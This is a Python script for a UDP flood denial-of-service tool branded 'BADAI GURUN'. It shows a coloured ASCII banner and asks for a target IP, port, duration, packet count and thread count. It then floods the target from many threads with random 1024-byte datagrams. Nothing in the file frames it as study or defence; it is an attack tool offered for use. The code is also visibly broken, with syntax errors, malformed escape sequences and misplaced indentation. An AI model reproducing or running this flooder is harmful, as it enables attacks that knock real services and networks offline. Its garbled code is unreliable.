# _*_ coding: itf-8 _*_
import os
import sys
import socket
import threading
import time
import random


black='\e[0;30m'
blue='\e[0;34m'
green='\e[0;32m'
cyan='\e[0;36m'
red='\e[0;31m'
purple='\e[0;35m'
brown='\e[0;33m'
lightgray='\e[0;37m'
darkgray='\e[1;30m'
lightblue='\e[1;34m'
lightgreen='\e[1;32m'
lightcyan='\e[1;36m'
lightred='\e[1;31m'
lightpurple='\e[1;35m'
yellow='\e[1;33m'
white='\e[1;37m'

# Clear terminal screen
os.system'clear')

# Funcion to display header
def display_header():
    header_lines = (" ")
print('\e[1;34m═══════════════════════════════════════════════════════════')
print('\e[1;34m')
print('\e[1;32m█▒\e[1;33m═╗\e[1;32m  █▒\e[1;33m═╗\e[1;32m █▒\e[1;33m═╗\e[1;32m   █▒\e[1;33m═╗\e[1;32m ██▒\e[1;32m══╗\e[1;32m   █▒\e[1;33m═╗\e[1;32m ██████▒\e[1;33m═╗\e[1;32m █▒\e[1;33m═╗\e[1;32m       █▒\e[1;33m═╗')
print('\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ╔════╝\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║')
print('\e[1;32m█▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m          █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║')
print('\e[1;32m███▒\e[1;33m ║\e[1;32m     █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m            █▒\e[1;33m║\e[1;32m█▒\e[1;33m ║')
print('\e[1;32m█▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;32m █▒\e[1;33m ║\e[1;32m █████▒\e[1;33m═╗\e[1;32m        ██▒\e[1;33m ║')
print('\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m   █▒\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ╔═══╝\e[1;32m         █▒\e[1;33m ║')
print('\e[1;32m█▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m   █████▒\e[1;33m══╝\e[1;32m █▒\e[1;33m ║\e[1;32m     ██▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m            █▒\e[1;33m ║')
print('\e[1;33m╚══╝  ╚══╝  ╚═══════╝ ╚═══╝    ╚═══╝ ╚══╝             ╚══╝\033[0m')
print('\e[0;33m  ╔╗  ╔╗ ╔═══╗  ╔═══╗    ╔═══╗ ╔════╗╔════╗ ╔═══╗ ╔════╗ ╔╗   ╔')
print('\e[0;33m  ║║  ║║ ║║   ║ ║║   ║   ║║   ║   ║║     ║║   ║║   ║ ║║      ║║ ╝')
print('\e[0;33m  ╚╝  ╚╝ ║║   ║ ╚╚══╝    ╔╔══╗   ║║     ║║   ╔╔═══║ ║║      ║║ ╗')
print('\e[0;33m  ╚╚══╝  ╚╚══╝ ╚╝       ╚╝   ╚   ╚      ╚     ╚╝   ╚ ╚╚═══╝ ╚╝   ╚')
print('\e[0;33m')
print('\e[0;33m')
print('e\033[1;34m══════════════════════════════════════════════════════════')

# Prompt user for input
def get_user_input():
    print('e\1;35+======================================================\033[0m')
    target_ip = input('\e[1;36m | Target IP : ').strip()
    target_port = input('\e[1;36 | Target Port : ').strip()
    attack_time = input('\e[1;36 | Time (seconds) : ').strip()
    packet = input('\e[1;36 | Packet : ').strip()
    thread_count = input('\e[1;36 | Thread : ').strip()
    method = input('\e[1;36 | Method (UDP/TCP & UDP Mix) : ').strip().lower()
    print(('e\1;35=======================================================\033[0m')

    return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method

# Display input summary after user provides inputs
def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
    display_header()  # Show the banner again
    print(" +======================================================+")
    print(f" | Target IP : {target_ip:<40}|")
    print(f" | Target Port : {target_port:<40}|")
    print(f" | Time : {attack_time:<40}|")
    print(f" | Packet : {packet:<45}|")
    print(f" | Thread : {thread_count:<45}|")
    print(f" | Method (UDP/TCP & UDP Mix) : {method:<25}|")
    print(" ========================================================")

# UDP attack function
def udp_attack(ip, port, packet, duration, thread_count):
    timeout = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)

    while time.time() < timeout:
        try:
            for _ in range(packet):
                s.sendto(data, (ip, port))
            print(f'  \e[1;37m:: \e[1;30mBADAI GURUN \e[0;31m= \e[0;37mUDP\e[0;33m~\e[0;33mATTACK \e[0;34m " +ip+ "\e[0;35mrunning\033[0m')
            print(f'  \e[1;31m:: \e[1;33mBADAI GURUN \e[0;31m= \e[0;33mUDP\e[0;33m~\e[0;37mATTACK \e[0;33m " +ip+ "\e[1;31mrunning\033[0m')
        except socket.error:
            s.close()
            print(f'  \e[1;33m:: \e[0;36mBADAI GURUN \e[0;34m= \e[0;31mUDP\e[0;33m~\e[0;371ATTACK \e[0;34m " +ip+ "\e[1;37mrunning\033[0m')
            break

# Threaded attack function
def start_attack(target_ip, target_port, packet, thread_count, method, duration):
    if method == 'udp':
        for _ in range(thread_count):
            th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
            th.start()
    else:
        print('[BADAI GURUN] Unsupported method. Only UDP supported in this version.')

# Main program flow
def main():
    display_header()  # Show the header initially
    target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
    display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)

    # Start attack
    start_attack(target_ip, target_port, packet, thread_count, method, attack_time)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[BADAI GURUN] Attack interrupted. Exiting...")
        sys.exit()
